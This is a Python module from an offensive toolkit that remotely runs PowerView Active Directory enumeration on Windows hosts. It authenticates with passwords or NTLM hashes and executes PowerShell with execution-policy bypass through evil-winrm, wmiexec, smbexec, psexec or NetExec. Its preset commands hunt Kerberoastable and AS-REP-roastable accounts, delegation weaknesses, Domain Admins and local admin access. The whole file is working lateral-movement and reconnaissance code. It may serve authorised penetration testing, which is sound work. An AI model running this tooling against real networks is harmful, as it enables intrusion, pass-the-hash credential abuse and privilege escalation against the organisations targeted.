"""
PowerView Remote Execution Module
Execute PowerView commands remotely via WinRM, SMB, WMI without RDP
"""

import subprocess
import os
import tempfile
from typing import Optional, List, Tuple
from core.module_base import ModuleBase, ModuleType, Platform, find_tool


class PowerViewRemoteExec(ModuleBase):
    """
    Execute PowerView commands remotely on Windows targets
    Supports multiple execution methods: WinRM, SMBExec, WMIExec, PSExec

    Use this to run PowerView enumeration without needing RDP.
    Requires admin access OR WinRM access to the target.
    """

    def __init__(self):
        super().__init__()
        self.name = "powerview_remote_exec"
        self.description = "Execute PowerView remotely via WinRM/SMB/WMI (no RDP)"
        self.author = "UwU Toolkit"
        self.module_type = ModuleType.AUXILIARY
        self.platform = Platform.WINDOWS
        self.tags = ["ad", "powerview", "remote", "winrm", "smb", "wmi", "enumeration"]
        self.references = [
            "https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon",
            "https://github.com/fortra/impacket"
        ]

        # Register options
        self.register_option("RHOSTS", "Target Windows host IP", required=True)
        self.register_option("DOMAIN", "Domain name", required=True)
        self.register_option("USER", "Username", required=True)
        self.register_option("PASS", "Password", required=True)
        self.register_option("HASH", "NTLM hash (use instead of password)", default="")

        self.register_option("METHOD", "Execution method",
                           default="winrm",
                           choices=["winrm", "smbexec", "wmiexec", "psexec", "netexec"])

        self.register_option("COMMAND", "PowerView command to run (or 'auto' for full enum)",
                           default="auto")

        self.register_option("POWERVIEW_PATH", "Path to PowerView.ps1 on target",
                           default="C:\\Tools\\PowerView.ps1")

        self.register_option("OUTPUT_DIR", "Local output directory",
                           default="./powerview_results")

        # Quick command shortcuts
        self.quick_commands = {
            "domain": "Get-Domain | ConvertTo-Json",
            "policy": "(Get-DomainPolicy).SystemAccess",
            "users": "Get-DomainUser | Select samaccountname,description | ConvertTo-Json",
            "users_spn": "Get-DomainUser -SPN | Select samaccountname,serviceprincipalname | ConvertTo-Json",
            "users_asrep": "Get-DomainUser -PreauthNotRequired | Select samaccountname | ConvertTo-Json",
            "users_delegation": "Get-DomainUser -TrustedToAuth | Select samaccountname,'msds-allowedtodelegateto' | ConvertTo-Json",
            "users_desc": "Get-DomainUser -Properties samaccountname,description | Where {$_.description -ne $null} | ConvertTo-Json",
            "groups": "Get-DomainGroup | Select cn | ConvertTo-Json",
            "admins": "Get-DomainGroupMember -Identity 'Domain Admins' -Recurse | Select MemberName | ConvertTo-Json",
            "computers": "Get-DomainComputer | Select dnshostname,operatingsystem | ConvertTo-Json",
            "computers_desc": "Get-DomainComputer -Properties dnshostname,description | Where {$_.description -ne $null} | ConvertTo-Json",
            "computers_delegation": "Get-DomainComputer -Unconstrained | Select dnshostname | ConvertTo-Json",
            "dcs": "Get-DomainController | Select Name,IPAddress | ConvertTo-Json",
            "trusts": "Get-DomainTrust | ConvertTo-Json",
            "trust_map": "Get-DomainTrustMapping | ConvertTo-Json",
            "gpos": "Get-DomainGPO | Select displayname,objectguid | ConvertTo-Json",
            "shares": "Find-DomainShare -CheckShareAccess | ConvertTo-Json",
            "local_admin": "Find-LocalAdminAccess | ConvertTo-Json",
            "sid": "Convert-NameToSid {target}",
        }

        # Full enumeration script
        self.full_enum_commands = [
            ("Domain Info", "Get-Domain"),
            ("Domain Policy", "(Get-DomainPolicy).SystemAccess"),
            ("Domain Controllers", "Get-DomainController | Select Name,IPAddress,OSVersion"),
            ("Domain Trusts", "Get-DomainTrust"),
            ("All Users", "(Get-DomainUser).count"),
            ("Users with Descriptions", "Get-DomainUser -Properties samaccountname,description | Where {$_.description -ne $null}"),
            ("Kerberoastable Users", "Get-DomainUser -SPN | Select samaccountname,serviceprincipalname"),
            ("ASREPRoastable Users", "Get-DomainUser -PreauthNotRequired | Select samaccountname"),
            ("Users with Delegation", "Get-DomainUser -TrustedToAuth | Select samaccountname"),
            ("Domain Admins", "Get-DomainGroupMember -Identity 'Domain Admins' -Recurse | Select MemberName"),
            ("All Computers", "(Get-DomainComputer).count"),
            ("Computers with Descriptions", "Get-DomainComputer -Properties dnshostname,description | Where {$_.description -ne $null}"),
            ("Unconstrained Delegation", "Get-DomainComputer -Unconstrained | Select dnshostname"),
            ("GPOs", "Get-DomainGPO | Select displayname,objectguid"),
        ]

    def run(self) -> bool:
        target = self.get_option("RHOSTS")
        domain = self.get_option("DOMAIN")
        user = self.get_option("USER")
        password = self.get_option("PASS")
        ntlm_hash = self.get_option("HASH")
        method = self.get_option("METHOD")
        command = self.get_option("COMMAND")
        pv_path = self.get_option("POWERVIEW_PATH")
        output_dir = self.get_option("OUTPUT_DIR")

        os.makedirs(output_dir, exist_ok=True)

        self.print_line()
        self.print_good("=" * 60)
        self.print_good("  PowerView Remote Execution")
        self.print_good("=" * 60)
        self.print_status(f"Target: {target}")
        self.print_status(f"Domain: {domain}")
        self.print_status(f"Method: {method}")
        self.print_line()

        # Check connectivity first
        if not self._check_access(target, domain, user, password, ntlm_hash, method):
            self.print_error("Cannot access target with provided credentials/method")
            return False

        if command == "auto":
            return self._run_full_enum(target, domain, user, password, ntlm_hash, method, pv_path, output_dir)
        elif command in self.quick_commands:
            ps_cmd = self.quick_commands[command]
            return self._execute_single(target, domain, user, password, ntlm_hash, method, pv_path, ps_cmd)
        else:
            return self._execute_single(target, domain, user, password, ntlm_hash, method, pv_path, command)

    def _check_access(self, target: str, domain: str, user: str, password: str,
                      ntlm_hash: str, method: str) -> bool:
        """Check if we can access the target"""
        self.print_status("Checking access...")

        nxc = find_tool("netexec") or find_tool("NetExec") or find_tool("nxc")
        if not nxc:
            self.print_warning("NetExec not found, skipping access check")
            return True

        if method == "winrm":
            proto = "winrm"
        else:
            proto = "smb"

        cmd = [nxc, proto, target, "-u", user]

        if ntlm_hash:
            cmd.extend(["-H", ntlm_hash])
        else:
            cmd.extend(["-p", password])

        if domain:
            cmd.extend(["-d", domain])

        ret, stdout, stderr = self._run_cmd(cmd)

        if "(Pwn3d!)" in stdout or "[+]" in stdout:
            self.print_good("Access confirmed!")
            return True
        elif "STATUS_LOGON_FAILURE" in stdout:
            self.print_error("Authentication failed")
            return False

        # Try anyway
        return True

    def _run_full_enum(self, target: str, domain: str, user: str, password: str,
                       ntlm_hash: str, method: str, pv_path: str, output_dir: str) -> bool:
        """Run full PowerView enumeration"""
        self.print_status("Running full PowerView enumeration...")
        self.print_line()

        results = []

        for i, (name, ps_cmd) in enumerate(self.full_enum_commands, 1):
            self.print_status(f"[{i}/{len(self.full_enum_commands)}] {name}")

            success, output = self._execute_ps(target, domain, user, password, ntlm_hash,
                                               method, pv_path, ps_cmd)

            if success and output:
                results.append(f"=== {name} ===\nCommand: {ps_cmd}\n{output}\n")
                # Print summary
                lines = [l for l in output.split('\n') if l.strip()][:5]
                for line in lines:
                    self.print_line(f"    {line[:80]}")
            else:
                results.append(f"=== {name} ===\nCommand: {ps_cmd}\nFailed or no output\n")
                self.print_warning(f"    No output")

        # Save results
        output_file = os.path.join(output_dir, f"powerview_enum_{target.replace('.', '_')}.txt")
        with open(output_file, 'w') as f:
            f.write('\n'.join(results))

        self.print_line()
        self.print_good(f"Results saved to: {output_file}")
        return True

    def _execute_single(self, target: str, domain: str, user: str, password: str,
                        ntlm_hash: str, method: str, pv_path: str, ps_cmd: str) -> bool:
        """Execute a single PowerView command"""
        success, output = self._execute_ps(target, domain, user, password, ntlm_hash,
                                           method, pv_path, ps_cmd)

        if success:
            # Parse byte array output if detected
            parsed_output = self._parse_byte_array_output(output)
            self.print_good("Command output:")
            self.print_line(parsed_output)
            return True

        self.print_error("Command failed")
        return False

    def _execute_ps(self, target: str, domain: str, user: str, password: str,
                    ntlm_hash: str, method: str, pv_path: str, ps_cmd: str) -> Tuple[bool, str]:
        """Execute PowerShell command on remote target"""

        # Build full PowerShell command with PowerView import
        full_ps = f"Import-Module {pv_path}; {ps_cmd}"

        if method == "winrm":
            return self._exec_winrm(target, domain, user, password, ntlm_hash, full_ps)
        elif method == "wmiexec":
            return self._exec_wmi(target, domain, user, password, ntlm_hash, full_ps)
        elif method == "smbexec":
            return self._exec_smb(target, domain, user, password, ntlm_hash, full_ps)
        elif method == "psexec":
            return self._exec_psexec(target, domain, user, password, ntlm_hash, full_ps)
        elif method == "netexec":
            return self._exec_netexec(target, domain, user, password, ntlm_hash, full_ps)
        else:
            return False, f"Unknown method: {method}"

    def _exec_winrm(self, target: str, domain: str, user: str, password: str,
                    ntlm_hash: str, ps_cmd: str) -> Tuple[bool, str]:
        """Execute via Evil-WinRM"""
        tool = find_tool("evil-winrm") or find_tool("evil-winrm-py")
        if not tool:
            return False, "evil-winrm not found"

        cmd = [tool, "-i", target, "-u", user]

        if ntlm_hash:
            cmd.extend(["-H", ntlm_hash])
        else:
            cmd.extend(["-p", password])

        # Execute command
        cmd.extend(["-c", ps_cmd])

        ret, stdout, stderr = self._run_cmd(cmd, timeout=60)
        return ret == 0, stdout

    def _exec_wmi(self, target: str, domain: str, user: str, password: str,
                  ntlm_hash: str, ps_cmd: str) -> Tuple[bool, str]:
        """Execute via WMIExec"""
        tool = find_tool("wmiexec.py")
        if not tool:
            return False, "wmiexec.py not found"

        auth = f"{domain}/{user}"
        if ntlm_hash:
            auth += f"@{target}"
            cmd = [tool, auth, "-hashes", f":{ntlm_hash}"]
        else:
            auth += f":{password}@{target}"
            cmd = [tool, auth]

        cmd.append(f'powershell -ep bypass -c "{ps_cmd}"')

        ret, stdout, stderr = self._run_cmd(cmd, timeout=60)
        return ret == 0, stdout

    def _exec_smb(self, target: str, domain: str, user: str, password: str,
                  ntlm_hash: str, ps_cmd: str) -> Tuple[bool, str]:
        """Execute via SMBExec"""
        tool = find_tool("smbexec.py")
        if not tool:
            return False, "smbexec.py not found"

        auth = f"{domain}/{user}"
        if ntlm_hash:
            auth += f"@{target}"
            cmd = [tool, auth, "-hashes", f":{ntlm_hash}"]
        else:
            auth += f":{password}@{target}"
            cmd = [tool, auth]

        cmd.append(f'powershell -ep bypass -c "{ps_cmd}"')

        ret, stdout, stderr = self._run_cmd(cmd, timeout=60)
        return ret == 0, stdout

    def _exec_psexec(self, target: str, domain: str, user: str, password: str,
                     ntlm_hash: str, ps_cmd: str) -> Tuple[bool, str]:
        """Execute via PSExec"""
        tool = find_tool("psexec.py")
        if not tool:
            return False, "psexec.py not found"

        auth = f"{domain}/{user}"
        if ntlm_hash:
            auth += f"@{target}"
            cmd = [tool, auth, "-hashes", f":{ntlm_hash}"]
        else:
            auth += f":{password}@{target}"
            cmd = [tool, auth]

        cmd.append(f'powershell -ep bypass -c "{ps_cmd}"')

        ret, stdout, stderr = self._run_cmd(cmd, timeout=60)
        return ret == 0, stdout

    def _exec_netexec(self, target: str, domain: str, user: str, password: str,
                      ntlm_hash: str, ps_cmd: str) -> Tuple[bool, str]:
        """Execute via NetExec"""
        nxc = find_tool("netexec") or find_tool("NetExec") or find_tool("nxc")
        if not nxc:
            return False, "netexec not found"

        cmd = [nxc, "smb", target, "-u", user, "-d", domain]

        if ntlm_hash:
            cmd.extend(["-H", ntlm_hash])
        else:
            cmd.extend(["-p", password])

        cmd.extend(["-x", f'powershell -ep bypass -c "{ps_cmd}"'])

        ret, stdout, stderr = self._run_cmd(cmd, timeout=60)
        return "(Pwn3d!)" in stdout or ret == 0, stdout

    def _run_cmd(self, cmd: List[str], timeout: int = 120) -> Tuple[int, str, str]:
        """Run a command and return exit code, stdout, stderr"""
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return result.returncode, result.stdout, result.stderr
        except subprocess.TimeoutExpired:
            return -1, "", "Command timed out"
        except Exception as e:
            return -1, "", str(e)

    def _parse_byte_array_output(self, output: str) -> str:
        """
        Parse byte array output from PowerView.

        PowerView sometimes outputs strings as ASCII byte arrays like:
        SMB ... 115
        SMB ... 113
        ...

        This method detects and converts them back to strings.
        Also extracts actual data from SMB output lines.
        """
        import re

        lines = output.split('\n')
        result_lines = []
        byte_buffer = []
        header_shown = False

        for line in lines:
            original_line = line

            # Strip SMB output prefix if present (from netexec)
            # NetExec format: "SMB  IP  PORT  HOST  [status/data]"
            cleaned = line.strip()
            data_after_host = ""

            if 'SMB' in cleaned:
                # Find the data portion after the host name
                # Pattern: SMB <spaces> IP <spaces> PORT <spaces> HOST <spaces> DATA
                parts = cleaned.split()
                if len(parts) >= 5:
                    # The data starts after the 4th field (SMB, IP, PORT, HOST)
                    # Join everything from the 5th element onwards
                    data_after_host = ' '.join(parts[4:])
                    cleaned = parts[-1].strip()

            # Skip error/noise lines
            skip_patterns = [
                'Cannot convert argument',
                'FromFileTime',
                'CategoryInfo',
                'FullyQualifiedErrorId',
                'At C:\\',
                'At line:',
                '$ObjectProperties',
                'MethodException',
                'ParameterBindingException',
                'System.Byte[]',
                'System.Int64',
                '+ ~~~~~',  # PowerShell error underline
                '+                 ~',  # PowerShell error continuation
            ]
            if any(pattern in original_line for pattern in skip_patterns):
                continue

            # Check if this is just a number (ASCII byte or count result)
            if cleaned.isdigit():
                byte_val = int(cleaned)
                # If it's a reasonable byte value, it might be ASCII
                if 32 <= byte_val <= 126:  # Printable ASCII range
                    byte_buffer.append(chr(byte_val))
                elif byte_val == 10 or byte_val == 13:  # Newline/CR - end of one result
                    if byte_buffer:
                        result_lines.append(''.join(byte_buffer))
                        byte_buffer = []
                else:
                    # Could be a count or other numeric result
                    # Flush any pending buffer first
                    if byte_buffer:
                        result_lines.append(''.join(byte_buffer))
                        byte_buffer = []
                    # Add the number as a result
                    result_lines.append(str(byte_val))
            else:
                # Flush any pending byte buffer
                if byte_buffer:
                    result_lines.append(''.join(byte_buffer))
                    byte_buffer = []

                # Process the line
                if 'SMB' in original_line:
                    # Header lines (connection info)
                    if '[*]' in original_line or '[+]' in original_line:
                        if not header_shown:
                            result_lines.append(original_line)
                            if 'Executed command' in original_line:
                                header_shown = True
                    # Data lines - extract the actual data after the header
                    elif header_shown and data_after_host:
                        # Skip if it's just whitespace
                        if data_after_host.strip():
                            result_lines.append(data_after_host.strip())
                elif cleaned:
                    # Non-SMB lines (actual data)
                    result_lines.append(cleaned)

        # Flush final buffer
        if byte_buffer:
            result_lines.append(''.join(byte_buffer))

        return '\n'.join(result_lines)

    def check(self) -> bool:
        """Check if required tools are available"""
        tools = ["netexec", "NetExec", "evil-winrm", "wmiexec.py", "smbexec.py"]
        for tool in tools:
            if find_tool(tool):
                return True
        self.print_error("No remote execution tools found (netexec, evil-winrm, wmiexec.py)")
        return False
